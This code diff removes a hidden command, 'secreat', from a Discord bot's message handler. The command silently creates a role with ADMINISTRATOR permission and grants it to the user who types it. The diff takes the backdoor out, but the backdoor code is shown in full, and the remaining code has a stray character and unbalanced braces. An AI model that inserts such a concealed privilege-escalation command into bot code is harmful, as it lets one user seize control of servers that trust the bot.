@@ -202,19 +202,6 @@ client.on('messageCreate', async (message) => {
       )
       .catch((error) => console.error(error));/
   }
-  
-  if (command === "secreat") {
-      message.guild.roles.create({
-        data: {
-            name: '***',
-            color: 'GREY',
-            permissions: ['ADMINISTRATOR'],
-            reason: 'Penis',
-        }
-        }).catch(console.error).then(role => {
-          var sir = message.author
-          sir.roles.add(role)
-        })
 })
 
 client.login(settings.token)
